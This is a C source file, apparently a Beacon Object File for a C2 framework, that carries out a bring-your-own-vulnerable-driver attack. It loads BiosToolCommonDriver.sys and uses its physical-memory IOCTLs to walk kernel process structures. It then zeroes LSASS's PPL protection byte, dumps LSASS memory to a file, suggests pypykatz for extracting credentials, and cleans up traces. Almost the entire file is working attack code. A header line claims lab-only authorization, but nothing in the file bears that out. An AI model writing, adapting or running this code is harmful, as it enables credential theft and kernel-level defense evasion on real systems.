/*
 * byovd_biostool.c - Beacon Object File for BYOVD LSASS dump via BiosToolCommonDriver.sys
 *
 * Chain:
 *   1. Load BiosToolCommonDriver.sys via NtLoadDriver
 *   2. Open \\.\BiosToolCommonDriver
 *   3. Walk EPROCESS linked list (VA->PA via driver IOCTL 0x222034)
 *   4. Find LSASS EPROCESS, strip PPL (Protection byte offset 0x87A on 22621)
 *   5. Dump LSASS via MiniDumpWriteDump to output file
 *   6. Unload driver
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -o byovd_biostool.o -c byovd_biostool.c \
 *       -masm=intel -Wall -static
 *
 * Execute via Kassandra:
 *   executeBOF byovd_biostool.o "C:\Windows\Temp\BiosToolCommonDriver.sys" \
 *               "C:\Windows\Temp\lsass.dmp"
 *
 * Authorization: isolated lab BYOVD research only (see CLAUDE.md).
 */

#include <windows.h>
#include <winternl.h>
#include <dbghelp.h>
#include <stdio.h>
#include <stdint.h>

/* Beacon API stubs - resolved at load time by the loader */
void    BeaconPrintf(int type, char *fmt, ...);
void   *BeaconDataParse(void *parser, char *buffer, int size);
char   *BeaconDataExtract(void *parser, int *size);
int     BeaconDataLength(void *parser);

#define CALLBACK_OUTPUT 0
#define CALLBACK_ERROR  0x0d

/* -----------------------------------------------------------------------
 * IOCTL codes for BiosToolCommonDriver.sys
 * ----------------------------------------------------------------------- */
#define BIOSTOOL_VA2PA      0x222034u   /* IN: [VA 8B][0 8B]  OUT: [VA 8B][PA 8B] */
#define BIOSTOOL_READ_PHYS  0x22202Cu   /* IN: [PA 8B][Sz 4B][Pad 4B]  OUT: [PA 8B][data..] */
#define BIOSTOOL_WRITE_PHYS 0x222030u

/* Windows 11 22621 EPROCESS offsets */
#define EPROC_LINKS_OFF      0x448   /* LIST_ENTRY ActiveProcessLinks */
#define EPROC_IMAGEFILENAME  0x5A8   /* CHAR[15] ImageFileName */
#define EPROC_PID_OFF        0x440   /* QWORD UniqueProcessId */
#define EPROC_PROTECTION_OFF 0x87A   /* BYTE PS_PROTECTION */

typedef LONG   NTSTATUS;
typedef LONG  *PNTSTATUS;

typedef struct _UNICODE_STRING_W {
    USHORT Length;
    USHORT MaximumLength;
    LPWSTR Buffer;
} UNICODE_STRING_W;

typedef NTSTATUS (NTAPI *NtLoadDriver_fn)(UNICODE_STRING_W *);
typedef NTSTATUS (NTAPI *NtUnloadDriver_fn)(UNICODE_STRING_W *);
typedef BOOL (WINAPI *MiniDumpWriteDump_fn)(HANDLE, DWORD, HANDLE, DWORD, PVOID, PVOID, PVOID);

/* Global driver handle */
static HANDLE g_dev = INVALID_HANDLE_VALUE;

/* -----------------------------------------------------------------------
 * Physical memory helpers
 * ----------------------------------------------------------------------- */
static uint64_t va2pa(uint64_t va) {
    struct { uint64_t va; uint64_t pa; } req = { va, 0 };
    DWORD got = 0;
    if (!DeviceIoControl(g_dev, BIOSTOOL_VA2PA, &req, sizeof(req),
                         &req, sizeof(req), &got, NULL))
        return 0;
    return req.pa;
}

static BOOL read_phys(uint64_t pa, void *buf, SIZE_T size) {
    UCHAR *dst = (UCHAR *)buf;
    while (size > 0) {
        ULONG_PTR off = (ULONG_PTR)pa & 0xFFF;
        ULONG chunk = (ULONG)((size < (0x1000 - off)) ? size : (0x1000 - off));
        struct { uint64_t pa; ULONG sz; ULONG pad; } req = { pa, chunk, 0 };
        UCHAR tmp[0x1008] = {0};
        DWORD got = 0;
        if (!DeviceIoControl(g_dev, BIOSTOOL_READ_PHYS,
                             &req, sizeof(req), tmp, sizeof(tmp), &got, NULL))
            return FALSE;
        memcpy(dst, tmp + 8, chunk);
        pa   += chunk;
        dst  += chunk;
        size -= chunk;
    }
    return TRUE;
}

static BOOL write_phys(uint64_t pa, void *data, SIZE_T size) {
    UCHAR *src = (UCHAR *)data;
    while (size > 0) {
        ULONG_PTR off = (ULONG_PTR)pa & 0xFFF;
        ULONG chunk = (ULONG)((size < (0x1000 - off)) ? size : (0x1000 - off));
        struct { uint64_t pa; ULONG sz; ULONG pad; UCHAR data[0x1000]; } req;
        memset(&req, 0, sizeof(req));
        req.pa = pa; req.sz = chunk;
        memcpy(req.data, src, chunk);
        DWORD got = 0;
        if (!DeviceIoControl(g_dev, BIOSTOOL_WRITE_PHYS,
                             &req, (DWORD)(sizeof(req) - 0x1000 + chunk),
                             &req, (DWORD)(sizeof(req) - 0x1000 + chunk), &got, NULL))
            return FALSE;
        pa   += chunk;
        src  += chunk;
        size -= chunk;
    }
    return TRUE;
}

static BOOL kread(uint64_t va, void *buf, SIZE_T size) {
    UCHAR *dst = (UCHAR *)buf;
    while (size > 0) {
        ULONG chunk = (ULONG)((size < 0x1000) ? size : 0x1000);
        uint64_t pa = va2pa(va);
        if (!pa) return FALSE;
        if (!read_phys(pa, dst, chunk)) return FALSE;
        va   += chunk;
        dst  += chunk;
        size -= chunk;
    }
    return TRUE;
}

static BOOL kwrite(uint64_t va, void *buf, SIZE_T size) {
    UCHAR *src = (UCHAR *)buf;
    while (size > 0) {
        ULONG chunk = (ULONG)((size < 0x1000) ? size : 0x1000);
        uint64_t pa = va2pa(va);
        if (!pa) return FALSE;
        if (!write_phys(pa, src, chunk)) return FALSE;
        va   += chunk;
        src  += chunk;
        size -= chunk;
    }
    return TRUE;
}

/* -----------------------------------------------------------------------
 * Locate ntoskrnl base by scanning exported functions from user mode
 * ----------------------------------------------------------------------- */
static uint64_t find_ntos_base(void) {
    /* Query NtQuerySystemInformation for kernel module list */
    typedef NTSTATUS (NTAPI *NtQuerySysInfo_fn)(ULONG, PVOID, ULONG, PULONG);
    NtQuerySysInfo_fn NtQSI = (NtQuerySysInfo_fn)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
    if (!NtQSI) return 0;

    #define SystemModuleInformation 11
    ULONG sz = 0;
    NtQSI(SystemModuleInformation, NULL, 0, &sz);
    sz += 0x10000;
    PVOID buf = HeapAlloc(GetProcessHeap(), 0, sz);
    if (!buf) return 0;

    NTSTATUS st = NtQSI(SystemModuleInformation, buf, sz, &sz);
    uint64_t base = 0;
    if (st == 0) {
        ULONG count = *(ULONG *)buf;
        PUCHAR entry = (PUCHAR)buf + sizeof(ULONG_PTR);  /* SYSTEM_MODULE_INFORMATION */
        /* Each SYSTEM_MODULE entry: 0x108 bytes; ImageBase at offset 0x10 (x64) */
        /* First entry is always ntoskrnl */
        uint64_t *imageBase = (uint64_t *)(entry + 0x10);
        base = *imageBase;
    }
    HeapFree(GetProcessHeap(), 0, buf);
    return base;
}

/* Resolve PsInitialSystemProcess export from ntoskrnl in user space to get VA */
static uint64_t find_ps_initial_system_process(uint64_t ntos_base) {
    /* Map ntoskrnl.exe from disk, find PsInitialSystemProcess export RVA, add kernel base. */
    WCHAR path[MAX_PATH] = L"\\\\?\\C:\\Windows\\System32\\ntoskrnl.exe";
    HANDLE hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                               OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return 0;

    DWORD fsize = GetFileSize(hFile, NULL);
    PVOID fbuf = HeapAlloc(GetProcessHeap(), 0, fsize);
    DWORD got = 0;
    ReadFile(hFile, fbuf, fsize, &got, NULL);
    CloseHandle(hFile);

    /* Parse PE export directory */
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)fbuf;
    IMAGE_NT_HEADERS *nt  = (IMAGE_NT_HEADERS *)((UCHAR *)fbuf + dos->e_lfanew);
    IMAGE_DATA_DIRECTORY *dd = &nt->OptionalHeader.DataDirectory[0];
    IMAGE_EXPORT_DIRECTORY *exp = (IMAGE_EXPORT_DIRECTORY *)((UCHAR *)fbuf + dd->VirtualAddress);
    DWORD *names    = (DWORD *)((UCHAR *)fbuf + exp->AddressOfNames);
    DWORD *funcs    = (DWORD *)((UCHAR *)fbuf + exp->AddressOfFunctions);
    WORD  *ordinals = (WORD  *)((UCHAR *)fbuf + exp->AddressOfNameOrdinals);

    uint64_t result = 0;
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        const char *name = (const char *)((UCHAR *)fbuf + names[i]);
        if (strcmp(name, "PsInitialSystemProcess") == 0) {
            DWORD rva = funcs[ordinals[i]];
            /* PsInitialSystemProcess is a PEPROCESS* - read it via kread */
            uint64_t var_va = ntos_base + rva;
            kread(var_va, &result, sizeof(result));
            break;
        }
    }
    HeapFree(GetProcessHeap(), 0, fbuf);
    return result;
}

/* -----------------------------------------------------------------------
 * BOF entry point
 *   args: [DWORD drvPathLen][drvPath bytes][DWORD outPathLen][outPath bytes]
 * ----------------------------------------------------------------------- */
void go(char *args, int args_len) {
    /* Parse beacon args: each arg is [int32 length][bytes] */
    int   pos      = 0;
    char *drv_path = NULL;
    char *out_path = NULL;

#define NEXT_STR(dst) do {                                  \
    if (pos + 4 > args_len) {                               \
        BeaconPrintf(CALLBACK_ERROR, "[-] arg parse\n");    \
        return;                                             \
    }                                                       \
    int _n = *(int *)(args + pos); pos += 4;                \
    (dst) = args + pos; pos += _n;                          \
} while (0)

    NEXT_STR(drv_path);
    NEXT_STR(out_path);
#undef NEXT_STR

    BeaconPrintf(CALLBACK_OUTPUT, "[byovd] driver: %s\n", drv_path);
    BeaconPrintf(CALLBACK_OUTPUT, "[byovd] output: %s\n", out_path);

    /* Convert paths to wide */
    WCHAR drv_wide[MAX_PATH] = {0};
    WCHAR out_wide[MAX_PATH] = {0};
    MultiByteToWideChar(CP_ACP, 0, drv_path, -1, drv_wide, MAX_PATH);
    MultiByteToWideChar(CP_ACP, 0, out_path, -1, out_wide, MAX_PATH);

    /* Enable SeLoadDriverPrivilege */
    HANDLE hToken = NULL;
    OpenProcessToken(GetCurrentProcess(),
                     TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
    TOKEN_PRIVILEGES tp = {0};
    tp.PrivilegeCount = 1;
    LookupPrivilegeValueA(NULL, "SeLoadDriverPrivilege", &tp.Privileges[0].Luid);
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);

    /* Copy driver to temp path */
    WCHAR tmp_drv[MAX_PATH] = {0};
    GetTempPathW(MAX_PATH, tmp_drv);
    wcscat(tmp_drv, L"btcd.sys");
    if (!CopyFileW(drv_wide, tmp_drv, FALSE)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] CopyFile drv failed: %lu\n", GetLastError());
        return;
    }

    /* Register driver in registry */
    HKEY hKey = NULL;
    WCHAR reg_path[256] = L"SYSTEM\\CurrentControlSet\\Services\\BiosToolDrv";
    RegCreateKeyExW(HKEY_LOCAL_MACHINE, reg_path, 0, NULL, 0,
                    KEY_ALL_ACCESS, NULL, &hKey, NULL);
    DWORD type_val = 1, start_val = 3, err_val = 1;
    RegSetValueExW(hKey, L"Type",         0, REG_DWORD, (BYTE*)&type_val,  4);
    RegSetValueExW(hKey, L"Start",        0, REG_DWORD, (BYTE*)&start_val, 4);
    RegSetValueExW(hKey, L"ErrorControl", 0, REG_DWORD, (BYTE*)&err_val,   4);
    WCHAR img_path[MAX_PATH];
    _snwprintf(img_path, MAX_PATH, L"\\??\\%s", tmp_drv);
    RegSetValueExW(hKey, L"ImagePath", 0, REG_EXPAND_SZ,
                   (BYTE*)img_path, (DWORD)((wcslen(img_path)+1)*2));
    RegCloseKey(hKey);

    /* NtLoadDriver */
    NtLoadDriver_fn NtLoadDriver = (NtLoadDriver_fn)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtLoadDriver");
    if (!NtLoadDriver) {
        BeaconPrintf(CALLBACK_ERROR, "[-] NtLoadDriver not found\n");
        return;
    }

    WCHAR full_reg[256] = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\BiosToolDrv";
    UNICODE_STRING_W uReg = {
        (USHORT)(wcslen(full_reg) * 2),
        (USHORT)((wcslen(full_reg) + 1) * 2),
        full_reg
    };
    NTSTATUS st = NtLoadDriver(&uReg);
    BeaconPrintf(CALLBACK_OUTPUT, "[byovd] NtLoadDriver: 0x%08X\n", (unsigned)st);
    if (st != 0 && st != (NTSTATUS)0xC0000035) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Driver load failed\n");
        return;
    }

    /* Open device */
    g_dev = CreateFileW(L"\\\\.\\BiosToolCommonDriver",
                        GENERIC_READ | GENERIC_WRITE, 0, NULL,
                        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (g_dev == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Open BiosToolCommonDriver failed: %lu\n",
                     GetLastError());
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[byovd] device opened\n");

    /* Find ntoskrnl base */
    uint64_t ntos_base = find_ntos_base();
    if (!ntos_base) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Could not find ntoskrnl base\n");
        goto cleanup;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[byovd] ntoskrnl @ 0x%016llx\n", ntos_base);

    /* Find PsInitialSystemProcess -> System EPROCESS */
    uint64_t system_eproc = find_ps_initial_system_process(ntos_base);
    if (!system_eproc) {
        BeaconPrintf(CALLBACK_ERROR, "[-] PsInitialSystemProcess resolve failed\n");
        goto cleanup;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[byovd] System EPROCESS @ 0x%016llx\n", system_eproc);

    /* Walk EPROCESS list to find LSASS */
    uint64_t lsass_eproc = 0;
    DWORD    lsass_pid   = 0;
    uint64_t cur = system_eproc;
    for (int i = 0; i < 512; i++) {
        char name[16] = {0};
        DWORD pid = 0;
        if (!kread(cur + EPROC_IMAGEFILENAME, name, 15)) break;
        if (!kread(cur + EPROC_PID_OFF, &pid, 4)) break;
        if (_stricmp(name, "lsass.exe") == 0) {
            lsass_eproc = cur;
            lsass_pid   = pid;
            break;
        }
        uint64_t flink = 0;
        if (!kread(cur + EPROC_LINKS_OFF, &flink, 8)) break;
        if (!flink || flink == system_eproc + EPROC_LINKS_OFF) break;
        cur = flink - EPROC_LINKS_OFF;
    }
    if (!lsass_eproc) {
        BeaconPrintf(CALLBACK_ERROR, "[-] LSASS EPROCESS not found\n");
        goto cleanup;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[byovd] lsass PID=%u EPROCESS=0x%016llx\n",
                 (unsigned)lsass_pid, lsass_eproc);

    /* Strip PPL (Protection byte 0x87A: 0x50 -> 0x00) */
    BYTE prot_orig = 0, prot_zero = 0;
    kread(lsass_eproc + EPROC_PROTECTION_OFF, &prot_orig, 1);
    BeaconPrintf(CALLBACK_OUTPUT, "[byovd] PPL byte: 0x%02X -> stripping\n",
                 (unsigned)prot_orig);
    kwrite(lsass_eproc + EPROC_PROTECTION_OFF, &prot_zero, 1);

    /* Open LSASS handle */
    HANDLE hLsass = OpenProcess(PROCESS_ALL_ACCESS, FALSE, lsass_pid);
    if (!hLsass) {
        /* Try with PROCESS_VM_READ | PROCESS_QUERY_INFORMATION */
        hLsass = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, lsass_pid);
    }
    if (!hLsass) {
        BeaconPrintf(CALLBACK_ERROR, "[-] OpenProcess lsass failed: %lu\n", GetLastError());
        /* Restore PPL before exiting */
        kwrite(lsass_eproc + EPROC_PROTECTION_OFF, &prot_orig, 1);
        goto cleanup;
    }

    /* MiniDumpWriteDump */
    HMODULE hDbgHelp = LoadLibraryA("dbghelp.dll");
    MiniDumpWriteDump_fn MiniDump = hDbgHelp ?
        (MiniDumpWriteDump_fn)GetProcAddress(hDbgHelp, "MiniDumpWriteDump") : NULL;

    if (!MiniDump) {
        BeaconPrintf(CALLBACK_ERROR, "[-] MiniDumpWriteDump not found\n");
        kwrite(lsass_eproc + EPROC_PROTECTION_OFF, &prot_orig, 1);
        CloseHandle(hLsass);
        goto cleanup;
    }

    HANDLE hOut = CreateFileW(out_wide,
                              GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                              FILE_ATTRIBUTE_NORMAL, NULL);
    if (hOut == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[-] CreateFile output failed: %lu\n", GetLastError());
        kwrite(lsass_eproc + EPROC_PROTECTION_OFF, &prot_orig, 1);
        CloseHandle(hLsass);
        goto cleanup;
    }

    #define MiniDumpWithFullMemory 2
    BOOL ok = MiniDump(hLsass, lsass_pid, hOut, MiniDumpWithFullMemory,
                       NULL, NULL, NULL);
    DWORD dump_err = GetLastError();
    CloseHandle(hOut);

    /* Restore PPL */
    kwrite(lsass_eproc + EPROC_PROTECTION_OFF, &prot_orig, 1);
    CloseHandle(hLsass);

    if (ok) {
        LARGE_INTEGER fsz = {0};
        HANDLE hCheck = CreateFileW(out_wide, GENERIC_READ, FILE_SHARE_READ, NULL,
                                    OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hCheck != INVALID_HANDLE_VALUE) {
            GetFileSizeEx(hCheck, &fsz);
            CloseHandle(hCheck);
        }
        BeaconPrintf(CALLBACK_OUTPUT, "[+] LSASS dump written: %lld bytes\n",
                     (long long)fsz.QuadPart);
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Run: pypykatz lsa minidump %s\n", out_path);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[-] MiniDumpWriteDump failed: %lu\n", dump_err);
    }

cleanup:
    if (g_dev != INVALID_HANDLE_VALUE) {
        CloseHandle(g_dev);
        g_dev = INVALID_HANDLE_VALUE;
    }

    /* Unload driver */
    NtUnloadDriver_fn NtUnloadDriver = (NtUnloadDriver_fn)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtUnloadDriver");
    if (NtUnloadDriver) NtUnloadDriver(&uReg);

    /* Cleanup registry key */
    RegDeleteKeyW(HKEY_LOCAL_MACHINE,
                  L"SYSTEM\\CurrentControlSet\\Services\\BiosToolDrv");
    /* Delete temp driver */
    DeleteFileW(tmp_drv);
}
